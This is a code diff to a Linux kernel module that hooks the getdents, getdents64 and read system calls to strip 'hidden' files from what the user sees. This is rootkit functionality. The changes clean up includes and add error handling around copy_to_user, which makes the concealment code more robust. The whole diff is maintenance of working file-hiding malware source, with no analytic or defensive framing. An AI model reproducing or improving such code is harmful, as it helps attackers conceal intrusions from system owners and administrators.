@@ -3,10 +3,7 @@
 #include <linux/list.h>
 #include <linux/slab.h>
 #include <linux/string.h>
-#include <linux/fs.h>
 #include <linux/proc_fs.h>
-#include <linux/dirent.h>
-#include <linux/syscalls.h>
 #include <linux/kallsyms.h>
 #include <linux/uaccess.h>
 #include <linux/version.h>
@@ -89,7 +86,6 @@ static int hooked_getdents64(unsigned int fd,
     if (ret <= 0)
         return ret;
 
-    struct linux_dirent64 __user *cur = dirent;
     int                           bpos = 0;
     struct hidden_file           *hf;
     char                         *buf;
@@ -121,7 +117,8 @@ static int hooked_getdents64(unsigned int fd,
 next:;
     }
 
-    copy_to_user(dirent, buf, new_ret);
+    if (copy_to_user(dirent, buf, new_ret))
+        pr_warn("WLKOM: copy_to_user failed\n");
     kfree(buf);
     return new_ret;
 }
@@ -167,7 +164,8 @@ static int hooked_getdents(unsigned int fd,
 next:;
     }
 
-    copy_to_user(dirent, buf, new_ret);
+    if (copy_to_user(dirent, buf, new_ret))
+        pr_warn("WLKOM: copy_to_user failed\n");
     kfree(buf);
     return new_ret;
 }
@@ -216,7 +214,8 @@ static long hooked_read(unsigned int fd, char __user *buf, size_t count)
         }
     }
 
-    copy_to_user(buf, kbuf, new_ret);
+    if (copy_to_user(buf, kbuf, new_ret))
+        pr_warn("WLKOM: copy_to_user failed\n");
     kfree(kbuf);
     return new_ret;
 }
